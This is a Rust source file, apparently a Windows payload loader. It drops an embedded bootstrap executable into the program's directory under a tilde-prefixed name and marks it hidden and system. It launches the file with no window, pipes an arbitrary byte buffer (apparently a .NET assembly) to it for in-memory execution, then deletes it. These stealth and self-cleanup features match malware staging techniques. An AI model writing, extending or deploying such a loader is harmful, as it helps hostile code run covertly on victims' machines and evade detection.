#[cfg(not(windows))]
pub fn run_dotnet_inmemory(_data: &[u8]) -> i32 {
    -100
}

#[cfg(windows)]
pub fn run_dotnet_inmemory(data: &[u8]) -> i32 {
    if data.len() < 64 {
        return -1;
    }
    unsafe { pipe_loader::run(data) }
}

#[cfg(windows)]
mod pipe_loader {
    use std::ffi::c_void;
    use std::ptr;

    #[repr(C)]
    struct SecurityAttributes {
        length: u32,
        descriptor: *mut c_void,
        inherit: i32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct StartupInfoW {
        cb: u32,
        lpReserved: *mut u16,
        lpDesktop: *mut u16,
        lpTitle: *mut u16,
        dwX: u32, dwY: u32, dwXSize: u32, dwYSize: u32,
        dwXCountChars: u32, dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        cbReserved2: u16,
        lpReserved2: *mut u8,
        hStdInput: isize,
        hStdOutput: isize,
        hStdError: isize,
    }

    #[repr(C)]
    struct ProcessInformation {
        process: isize,
        thread: isize,
        process_id: u32,
        thread_id: u32,
    }

    #[allow(non_snake_case)]
    extern "system" {
        fn CreatePipe(
            read: *mut isize, write: *mut isize,
            attr: *const SecurityAttributes, size: u32,
        ) -> i32;
        fn CreateProcessW(
            app: *const u16, cmd: *mut u16,
            proc_attr: *mut c_void, thread_attr: *mut c_void,
            inherit: i32, flags: u32,
            env: *mut c_void, dir: *const u16,
            si: *const StartupInfoW, pi: *mut ProcessInformation,
        ) -> i32;
        fn WriteFile(
            handle: isize, buf: *const u8,
            len: u32, written: *mut u32, overlapped: *mut c_void,
        ) -> i32;
        fn WaitForSingleObject(handle: isize, ms: u32) -> u32;
        fn CloseHandle(handle: isize) -> i32;
        fn GetTempPathW(buf_len: u32, buf: *mut u16) -> u32;
        fn GetLongPathNameW(short: *const u16, long: *mut u16, buf: u32) -> u32;
        fn SetFileAttributesW(lpFileName: *const u16, dwFileAttributes: u32) -> i32;
    }

    #[cfg(target_arch = "x86")]
    static BOOTSTRAP_EXE: &[u8] = include_bytes!("bootstrap_x86.exe");
    #[cfg(target_arch = "x86_64")]
    static BOOTSTRAP_EXE: &[u8] = include_bytes!("bootstrap_x64.exe");

    fn wide(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    fn wide_to_string(w: &[u16]) -> String {
        let len = w.iter().position(|&c| c == 0).unwrap_or(w.len());
        String::from_utf16_lossy(&w[..len])
    }

    unsafe fn get_temp_path() -> Option<String> {
        let mut buf = [0u16; 512];
        let len = GetTempPathW(512, buf.as_mut_ptr());
        if len == 0 || len > 500 { return None; }
        let mut long_buf = [0u16; 512];
        let long_len = GetLongPathNameW(buf.as_ptr(), long_buf.as_mut_ptr(), 512);
        if long_len > 0 && long_len < 500 {
            Some(wide_to_string(&long_buf))
        } else {
            Some(wide_to_string(&buf))
        }
    }

    pub unsafe fn run(data: &[u8]) -> i32 {
        let temp_dir = match get_temp_path() {
            Some(d) => d,
            None => return -40,
        };
        let app_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_string_lossy().to_string()))
            .unwrap_or_else(|| temp_dir.clone());
        let app_dir = app_dir.trim_end_matches('\\').to_string();
        let exe_path = format!("{}\\~kgl{}.exe", app_dir, std::process::id());

        if std::fs::write(&exe_path, BOOTSTRAP_EXE).is_err() {
            return -40;
        }
        const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
        const FILE_ATTRIBUTE_SYSTEM: u32 = 0x4;
        SetFileAttributesW(
            wide(&exe_path).as_ptr(),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        );

        let sa = SecurityAttributes {
            length: std::mem::size_of::<SecurityAttributes>() as u32,
            descriptor: ptr::null_mut(),
            inherit: 1,
        };
        let mut read_pipe: isize = 0;
        let mut write_pipe: isize = 0;
        if CreatePipe(&mut read_pipe, &mut write_pipe, &sa, 0) == 0 {
            let _ = std::fs::remove_file(&exe_path);
            return -42;
        }

        let cmd_str = format!("\"{}\" {} {} \"{}\"", exe_path, read_pipe, data.len(), app_dir);
        let mut cmd = wide(&cmd_str);

        let si = StartupInfoW {
            cb: std::mem::size_of::<StartupInfoW>() as u32,
            lpReserved: ptr::null_mut(),
            lpDesktop: ptr::null_mut(),
            lpTitle: ptr::null_mut(),
            dwX: 0, dwY: 0, dwXSize: 0, dwYSize: 0,
            dwXCountChars: 0, dwYCountChars: 0,
            dwFillAttribute: 0,
            dwFlags: 0,
            wShowWindow: 0,
            cbReserved2: 0,
            lpReserved2: ptr::null_mut(),
            hStdInput: 0,
            hStdOutput: 0,
            hStdError: 0,
        };

        let mut pi = ProcessInformation {
            process: 0, thread: 0, process_id: 0, thread_id: 0,
        };

        let dir_wide = wide(&app_dir);
        let created = CreateProcessW(
            ptr::null(),
            cmd.as_mut_ptr(),
            ptr::null_mut(), ptr::null_mut(),
            1,
            0x08000000,
            ptr::null_mut(), dir_wide.as_ptr(),
            &si, &mut pi,
        );

        CloseHandle(read_pipe);

        if created == 0 {
            CloseHandle(write_pipe);
            let _ = std::fs::remove_file(&exe_path);
            return -43;
        }

        let mut offset = 0usize;
        while offset < data.len() {
            let chunk = std::cmp::min(data.len() - offset, 65536);
            let mut w: u32 = 0;
            let ok = WriteFile(
                write_pipe,
                data.as_ptr().add(offset),
                chunk as u32, &mut w, ptr::null_mut(),
            );
            if ok == 0 || w == 0 { break; }
            offset += w as usize;
        }
        CloseHandle(write_pipe);

        WaitForSingleObject(pi.process, 0xFFFFFFFF);

        CloseHandle(pi.thread);
        CloseHandle(pi.process);
        let _ = std::fs::remove_file(&exe_path);

        0
    }
}
